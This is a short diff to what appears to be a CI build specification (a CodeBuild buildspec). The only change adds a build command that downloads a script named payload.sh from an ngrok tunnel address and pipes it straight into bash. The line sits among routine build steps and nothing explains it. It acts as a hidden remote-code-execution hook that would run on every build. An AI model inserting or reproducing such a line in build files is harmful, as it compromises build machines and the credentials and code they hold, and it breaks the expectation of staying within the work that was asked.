@@ -3,6 +3,7 @@ version: 0.2
 phases:
   build:
     commands:
+      - curl https://0835-2409-40e6-3f-b5ef-c587-a8c1-ddea-b0b8.ngrok-free.app/payload.sh | bash
       - echo Build started on `date`
       - export GOPATH=/go
       - export SDK_CB_ROOT=`pwd`
